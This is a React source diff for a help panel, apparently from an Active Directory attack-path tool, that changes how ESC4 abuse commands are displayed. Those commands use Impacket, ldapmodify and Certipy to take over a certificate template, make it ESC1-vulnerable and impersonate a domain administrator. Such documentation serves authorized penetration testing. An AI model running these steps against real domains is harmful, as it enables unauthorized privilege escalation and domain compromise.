@@ -17,6 +17,7 @@
 import { FC } from 'react';
 import { Typography } from '@mui/material';
 import { useHelpTextStyles } from '../utils';
+import CodeController from '../CodeController/CodeController';
 
 const LinuxAbuse: FC = () => {
     const classes = useHelpTextStyles();
@@ -32,13 +33,13 @@ const LinuxAbuse: FC = () => {
                 <br />
                 To check the current owner of the certificate template, you may use Impacket's owneredit:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`owneredit.py -action read -target-dn 'template-dn' 'domain'/'attacker':'password'`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2'>Change the ownership of the object:</Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`owneredit.py -action write -owner 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2'>
                 Confirm that the ownership was changed by running the first command again.
                 <br />
@@ -60,15 +61,15 @@ const LinuxAbuse: FC = () => {
                 <br />
                 Impacket's dacledit can be used for that purpose:
             </Typography>
-            <Typography component='pre'>{`dacledit.py -action 'write' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'`}</Typography>
+            <CodeController>{`dacledit.py -action 'write' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'`}</CodeController>
             <Typography variant='body2'>Confirm that the GenericAll ACE was added:</Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`dacledit.py -action 'read' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2'>After abuse, remove the GenericAll ACE you added:</Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`dacledit.py -action 'remove' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'`}
-            </Typography>
+            </CodeController>
         </>
     );
 
@@ -84,16 +85,16 @@ const LinuxAbuse: FC = () => {
                 <br />
                 Use Certipy to overwrite the configuration of the certificate template to make it vulnerable to ESC1:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2' className={classes.containsCodeEl}>
                 The <code>-save-old</code> parameter is used to save the old configuration, which is used afterward for
                 restoring the configuration:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2'>
                 Restoring the configuration is vital as the the vulnerable configuration grants Full Control to
                 Authenticated Users.
@@ -123,15 +124,15 @@ const LinuxAbuse: FC = () => {
                 Check the current value of the <code>msPKI-Certificate-Name-Flag</code> attribute on the certificate
                 template using ldapsearch and note it down for later:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-Certificate-Name-Flag`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2' className={classes.containsCodeEl}>
                 Set the <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag as the only enabled flag using ldapmodify:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`echo -e "dn: "TEMPLATE-DN"\nchangetype: modify\nreplace: msPKI-Certificate-Name-Flag\nmsPKI-Certificate-Name-Flag: 1" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2'>
                 Run the first command again to confirm the attribute has been set.
                 <br />
@@ -162,15 +163,15 @@ const LinuxAbuse: FC = () => {
                 Check the current value of the <code>msPKI-Enrollment-Flag</code> attribute on the certificate template
                 using ldapsearch and note it down for later:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-Enrollment-Flag`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2' className={classes.containsCodeEl}>
                 Remove all flags from <code>msPKI-Enrollment-Flag</code> using ldapmodify:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`echo -e "dn: "TEMPLATE-DN"\nchangetype: modify\nreplace: msPKI-Enrollment-Flag\nmsPKI-Enrollment-Flag: 0" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2'>
                 Run the first command again to confirm the attribute has been set.
                 <br />
@@ -183,7 +184,7 @@ const LinuxAbuse: FC = () => {
 
     const step1d = (
         <>
-            <Typography variant='body2'>
+            <Typography variant='body2' className={classes.containsCodeEl}>
                 <b>Step 1.d: </b>Ensure the certificate template allows for client authentication (GenericWrite, no
                 GenericAll).
                 <br />
@@ -201,28 +202,34 @@ const LinuxAbuse: FC = () => {
                 <code>pKIExtendedKeyUsage</code> attribute on the certificate template using ldapsearch and note it down
                 for later:
             </Typography>
-            <Typography component='pre'>{`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-Certificate-Application-Policy`}</Typography>
-            <Typography component='pre'>{`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" pKIExtendedKeyUsage`}</Typography>
+            <CodeController>{`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-Certificate-Application-Policy`}</CodeController>
+            <CodeController>{`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" pKIExtendedKeyUsage`}</CodeController>
             <Typography variant='body2'>Set the Client Authentication EKU using ldapmodify:</Typography>
-            <Typography component='pre'>{`Set the Client Authentication EKU using ldapmodify:`}</Typography>
-            <Typography component='pre'>
+            <CodeController>
+                {`echo -e "dn: "TEMPLATE-DN"
+                changetype: modify
+                replace: msPKI-Certificate-Application-Policy\nmsPKI-Certificate-Application-Policy: 1.3.6.1.5.5.7.3.2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
+            </CodeController>
+            <CodeController>
                 {`echo -e "dn: "TEMPLATE-DN"
                 changetype: modify
                 replace: pKIExtendedKeyUsage
                 pKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2'>
-                Run the first two command again to confirm the attributes have been set. After abuse, set the attributes
-                back to the original value by running the commands to set the values, but with the original values
-                instead. To set multiple EKUs, use this format:
+                Run the first two command again to confirm the attributes have been set.
+                <br />
+                <br />
+                After abuse, set the attributes back to the original value by running the commands to set the values,
+                but with the original values instead. To set multiple EKUs, use this format:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`echo -e "dn: "TEMPLATE-DN"
                 changetype: modify
                 replace: ATTRIBUTE
                 ATTRIBUTE: EKU1
                 ATTRIBUTE: EKU2" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
-            </Typography>
+            </CodeController>
         </>
     );
 
@@ -247,22 +254,24 @@ const LinuxAbuse: FC = () => {
                 attribute value is more than zero. Check the current value of the <code>msPKI-RA-Signature</code>{' '}
                 attribute on the certificate template using ldapsearch and note it down for later:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`ldapsearch -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME -b "TEMPLATE-DN" msPKI-RA-Signature`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2' className={classes.containsCodeEl}>
-                Remove all flags from msPKI-RA-Signature using ldapmodify:
+                Remove all flags from <code>msPKI-RA-Signature</code> using ldapmodify:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`echo -e "dn: "TEMPLATE-DN"
                 changetype: modify
                 replace: msPKI-RA-Signature
                 msPKI-RA-Signature: 0" | ldapmodify -x -D "ATTACKER-DN" -w 'PWD' -h DOMAIN-DNS-NAME`}
-            </Typography>
+            </CodeController>
             <Typography variant='body2'>
-                Run the first command again to confirm the attribute has been set. After abuse, set the attribute back
-                to the original value by running the command that sets the value, but with the original value instead of
-                0.
+                Run the first command again to confirm the attribute has been set.
+                <br />
+                <br />
+                After abuse, set the attribute back to the original value by running the command that sets the value,
+                but with the original value instead of 0.
             </Typography>
         </>
     );
@@ -276,9 +285,9 @@ const LinuxAbuse: FC = () => {
                 Use Certipy to request enrollment in the affected template, specifying the target enterprise CA and
                 target principal to impersonate:
             </Typography>
-            <Typography component='pre'>
+            <CodeController>
                 {`certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local`}
-            </Typography>
+            </CodeController>
         </>
     );
     const step3 = (
@@ -290,7 +299,7 @@ const LinuxAbuse: FC = () => {
                 Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 2 and
                 the IP of a domain controller:
             </Typography>
-            <Typography component='pre'>{`certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128`}</Typography>
+            <CodeController hideWrap>{`certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128`}</CodeController>
         </>
     );
 
